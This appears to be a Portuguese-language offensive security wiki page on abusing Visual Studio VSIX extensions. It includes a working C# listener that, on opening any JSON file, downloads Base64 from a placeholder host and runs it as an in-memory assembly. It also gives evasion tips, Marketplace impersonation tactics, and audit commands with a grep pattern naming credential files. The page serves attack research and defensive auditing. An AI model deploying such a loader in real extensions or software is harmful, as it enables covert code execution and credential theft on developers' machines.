# Abuso de Extensões VSIX do Visual Studio

{{#include ../banners/hacktricks-training.md}}

Uma extensão do Visual Studio pode transformar atividades rotineiras no editor em execução de código com a identidade do usuário conectado. Um VSIX malicioso, um publisher impostor ou uma atualização de extensão comprometida pode chegar a esse usuário por meio dos canais normais de instalação. A instalação com um prompt de administrador é um caminho de instalação consentido, não uma escalada automática de privilégios.<sup>[[1]](#references)</sup>

## Modelo de execução

Extensões clássicas do VSSDK geralmente são executadas dentro de `devenv.exe`. O modelo mais recente de `VisualStudio.Extensibility` executa principalmente extensões modernas do .NET fora do processo: o Visual Studio intermedeia chamadas para um processo dedicado `Microsoft.ServiceHub.Host.Extensibility`, isolando a estabilidade da IDE, mas **não** colocando a extensão em sandbox contra as permissões do Windows do usuário. O nome exato do executável pode incluir um sufixo de arquitetura, como `ServiceHub.Host.Extensibility.arm64.exe`.<sup>[[1]](#references)[[2]](#references)</sup>

### Acionar durante atividades comuns no editor

Em vez de expor apenas um comando de menu chamativo, uma extensão pode implementar `ITextViewOpenClosedListener`. Seu callback `TextViewOpenedAsync` é invocado para documentos correspondentes, enquanto `TextViewExtensionConfiguration.AppliesTo` pode restringir a ativação a um tipo comum, como JSON. Um formatter ou linter legítimo ainda pode realizar o trabalho anunciado enquanto uma segunda ação é executada como efeito colateral da abertura de um arquivo.<sup>[[1]](#references)[[3]](#references)</sup>

O padrão reduzido a seguir mostra os pontos de execução importantes; ele omite o formatter legítimo e o tratamento de erros para maior clareza.<sup>[[1]](#references)[[3]](#references)</sup>

<details>
<summary>Loader de assembly gerenciado em memória acionado por evento</summary>

```csharp
[VisualStudioContribution]
internal class JsonListener : ExtensionPart, ITextViewOpenClosedListener
{
    public TextViewExtensionConfiguration TextViewExtensionConfiguration => new()
    {
        AppliesTo = [DocumentFilter.FromDocumentType("json")]
    };

    public async Task TextViewOpenedAsync(ITextViewSnapshot view, CancellationToken ct)
    {
        using var http = new HttpClient();
        var encoded = (await http.GetStringAsync("https://example.invalid/update.txt", ct)).Trim();
        using var stream = new MemoryStream(Convert.FromBase64String(encoded));
        var context = new AssemblyLoadContext(Guid.NewGuid().ToString(), isCollectible: true);
        var entry = context.LoadFromStream(stream).EntryPoint
            ?? throw new InvalidOperationException("Assembly has no entry point");
        var argv = entry.GetParameters().Length == 0 ? null : new object?[] { Array.Empty<string>() };
        if (entry.Invoke(null, argv) is Task task) await task;
        context.Unload();
    }

    public Task TextViewClosedAsync(ITextViewSnapshot view, CancellationToken ct)
        => Task.CompletedTask;
}
```

</details>

Essa cadeia baixa texto Base64, decodifica-o em bytes de assembly, carrega-o de um `MemoryStream` por meio de um `AssemblyLoadContext` coletável, invoca o `EntryPoint` refletido sem parâmetros ou com um `string[]`, aguarda entry points assíncronos e descarrega o contexto. O segundo estágio não é gravado em disco, embora o VSIX e a DLL principal da extensão permaneçam como artefatos em disco. Base64 não oferece autenticidade nem confidencialidade; o uso de HTTP também permite que um atacante no caminho substitua a resposta.<sup>[[1]](#references)</sup>

Variações operacionais incluem suprimir todas as exceções para que o recurso anunciado continue funcionando quando o staging falhar ou usar `ITextViewChangedListener` para disparar após edições. O código é executado no host da extensão e pode usar APIs gerenciadas, P/Invoke, arquivos, credenciais e processos filhos disponíveis para esse usuário.<sup>[[1]](#references)</sup>

Para uma superfície de execução relacionada e específica do editor, baseada no carregamento automático de plugins nativos, consulte:

{{#ref}}
windows-local-privilege-escalation/notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Abuso da confiança no Marketplace e na distribuição

Um VSIX pode chegar como um arquivo compartilhado diretamente ou enviado por phishing, pelo Marketplace na Web ou pelo navegador integrado do Marketplace do Visual Studio. O registro de publicadores, que aplica principalmente exclusividade e uma lista de palavras reservadas, pode permitir identidades de publicador visualmente sugestivas; comprometer um publicador ou uma extensão já confiável é ainda mais eficaz, pois herda uma base de usuários instalada. A instalação pelo Marketplace invoca o Visual Studio Installer e coloca temporariamente o VSIX baixado em `%LOCALAPPDATA%\Temp`; `payload.vsix` também é usado legitimamente, então o nome do arquivo, por si só, não é um indicador.<sup>[[1]](#references)</sup>

A MDSec não identificou um protocolo de URL do Visual Studio que instalasse diretamente uma extensão. Ainda é necessário que o operador convença o usuário a instalar/confiar no VSIX ou comprometa o caminho de distribuição de uma extensão existente. Um pacote `AllUsers` é instalado na pasta de instalação do Visual Studio e pode solicitar elevação, mas esse é o comportamento normal de um instalador com consentimento, não uma forma automática de obter privilégios de administrador ou SYSTEM.<sup>[[1]](#references)[[4]](#references)</sup>

### Auditoria estática em escala

Pacotes VSIX geralmente são contêineres ZIP; assim, um pipeline seguro de revisão do Marketplace pode enumerar os pacotes, descompactá-los **sem carregar o código da extensão**, analisar os manifestos, identificar superfícies executáveis e descompilar assemblies gerenciados com `ilspycmd`. Priorize os assemblies pertencentes à extensão após excluir dependências comuns incluídas no pacote e, em seguida, correlacione strings de armazenamento de credenciais com grupos de comportamento, como leitura de arquivos mais envio pela rede, codificação mais envio, download mais execução, acesso ao gerenciador de credenciais mais acesso à rede ou captura de tela mais envio.<sup>[[1]](#references)[[5]](#references)</sup>

```bash
unzip -q sample.vsix -d sample-vsix
find sample-vsix -type f \( -iname '*.dll' -o -iname '*.exe' \) -print
ilspycmd -p -o decompiled sample-vsix/path/to/extension.dll
rg -n -i 'Login Data|logins\.json|key4\.db|wallet\.dat|\.aws[/\\]credentials|LoadFromStream|EntryPoint|cmd\.exe' decompiled
```

Também faça o inventário de DLLs nativas, targets do MSBuild, scripts, templates T4 e payloads de instaladores, em vez de presumir que toda superfície de execução consiste em código gerenciado. Compare o comportamento suspeito com a finalidade declarada no manifesto; telemetria e atualizadores legítimos podem se parecer com exfiltração ou staging. Uma análise apenas estática não detecta código compactado, ofuscado, resolvido dinamicamente ou dormente, e analisar somente a versão mais recente deixa de lado lançamentos históricos maliciosos.<sup>[[1]](#references)</sup>

O VS Code usa um host de extensões e um manifesto diferentes. Para um compartilhamento gravável que alimenta a instalação automatizada de uma extensão do VS Code, veja [execução por compartilhamento de extensões do VS Code](vscode-extension-abuse.md).

Um ataque separado durante o carregamento do projeto pode executar um target malicioso [MSBuild `GetFrameworkPaths`](visual-studio-project-msbuild-execution.md) sem instalar um VSIX.<sup>[[6]](#references)</sup>

## References

- [1] [MDSec - Extensões do Visual Studio revisadas](https://www.mdsec.co.uk/2026/05/visual-studio-extensions-revisited/)
- [2] [Microsoft Learn - Sobre VisualStudio.Extensibility](https://learn.microsoft.com/en-us/visualstudio/extensibility/visualstudio.extensibility/visualstudio-extensibility?view=visualstudio)
- [3] [Microsoft Learn - ITextViewOpenClosedListener.TextViewOpenedAsync](https://learn.microsoft.com/en-us/dotnet/api/microsoft.visualstudio.extensibility.editor.itextviewopenclosedlistener.textviewopenedasync?view=vs-extensibility)
- [4] [Microsoft Learn - Anatomia de um pacote VSIX](https://learn.microsoft.com/en-us/visualstudio/extensibility/anatomy-of-a-vsix-package?view=visualstudio)
- [5] [ILSpy - ferramenta .NET ilspycmd](https://github.com/icsharpcode/ILSpy/blob/master/ICSharpCode.ILSpyCmd/README.md)
- [6] [Unit 42 - Campanha Blinder Tunnel tem como alvo infraestrutura iraquiana](https://unit42.paloaltonetworks.com/blinder-tunnel-targets-critical-infrastructure/)
{{#include ../banners/hacktricks-training.md}}
